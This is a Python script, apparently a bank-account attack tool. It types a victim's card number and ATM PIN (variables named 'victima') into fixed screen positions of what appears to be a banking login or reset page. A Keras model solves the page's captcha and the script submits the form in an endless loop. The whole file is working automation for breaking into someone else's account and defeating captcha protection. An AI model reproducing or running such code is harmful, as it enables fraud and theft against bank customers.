import webbrowser
import pyautogui as p
import cv2
import os
from PIL import Image
import numpy as np
import tensorflow as tf
from keras.models import load_model
import time
import random
import string

class Variables:
    numdeTarjeta = 411,275
    clavedecajero = 460,386
    captcha = 455,574

    captchaclickderecho = 514,473
    captchaguardarimagen = 609,522

    continuar = 480,796

def generar_contraseña():
    caracteres = string.ascii_letters + string.digits
    
    contraseña = [random.choice(string.ascii_uppercase),
                  random.choice(string.ascii_lowercase),
                  random.choice(string.digits)]

    for _ in range(5): 
        contraseña.append(random.choice(caracteres))
    random.shuffle(contraseña)

    return ''.join(contraseña)

img_restablecer = "./image/restablecer.png"

arhivo_user = open("user.txt","r")
textoUser = arhivo_user.readlines()
arhivo_user.close()

victima_tar = textoUser[0].rstrip()
victima_dni = textoUser[1].rstrip()
victima_atm = textoUser[2].rstrip()

time.sleep(1)


while True:
    p.click(Variables.numdeTarjeta)
    p.typewrite(victima_tar)
    time.sleep(0.4)

    p.click(Variables.clavedecajero)
    p.typewrite(victima_atm)
    time.sleep(0.4)

    #print("Descargando captcha")
    p.rightClick(Variables.captchaclickderecho)
    time.sleep(0.7)
    p.click(Variables.captchaguardarimagen)
    time.sleep(1.4)
    p.press('enter')
    time.sleep(3)
    print("Calculando captcha...")


    # Crea la carpeta de salida si no existe
    if not os.path.exists('output'):
        os.makedirs('output')

    # Load image, grayscale
    image = cv2.imread('captcha.png')


    # Recortar y redimensionar la imagen
    def resize_and_save(image, output_path):
        image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
        imagen_redimensionada = Image.new('L', (50, 50), 'white')
        width, height = image_gray.shape[::-1]
        x = (50 - width) // 2
        y = (50 - height) // 2
        imagen_redimensionada.paste(Image.fromarray(image_gray), (x, y))
        imagen_redimensionada.save(output_path)

    # Guardar imágenes redimensionadas en escala de grises
    for i in range(1, 7):
        ruta_imagen = f"output/imageOut{i}.png"
        imageOut = image[1:60, (i-1)*25+5:i*25+5]
        resize_and_save(imageOut, ruta_imagen)

    #print("Imágenes procesadas y redimensionadas ")

    os.remove('captcha.png')

    # Cargar el modelo
    model = load_model("keras_Model.h5", compile=False)

    # Cargar las clases desde labels.txt
    with open("labels.txt", "r") as file:
        class_names = [line.strip() for line in file.readlines()]

    # Definir la función de predicción
    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 224, 224, 3], dtype=tf.float32)])
    def predict_image(image):
        prediction = model(image)
        return prediction

    # Inicializa una cadena vacía fuera del bucle
    txtcaptcha = ""

    for i in range(1, 7):
        ruta_imagen = f"output/imageOut{i}.png"
        imagen = cv2.imread(ruta_imagen)
        imagen = cv2.resize(imagen, (224, 224))
        imagen = imagen / 255.0
        imagen = np.expand_dims(imagen, axis=0)

        start_time = time.time()
        prediccion = predict_image(imagen)
        clase_predicha = class_names[np.argmax(prediccion)]
        confianza = np.max(prediccion)
        elapsed_time = time.time() - start_time

        # Obtiene el último carácter de la clase_predicha y lo concatena a la cadena
        txtcaptcha += clase_predicha[-1]

    # Imprime la cadena con los últimos caracteres
    print("Captcha:", txtcaptcha)


    p.click(Variables.captcha)
    p.typewrite(txtcaptcha)
    time.sleep(0.4)

    p.click(Variables.continuar)
    time.sleep(5)

    #Reiniciando 
    p.click(191,95)
    time.sleep(15)


input('pause')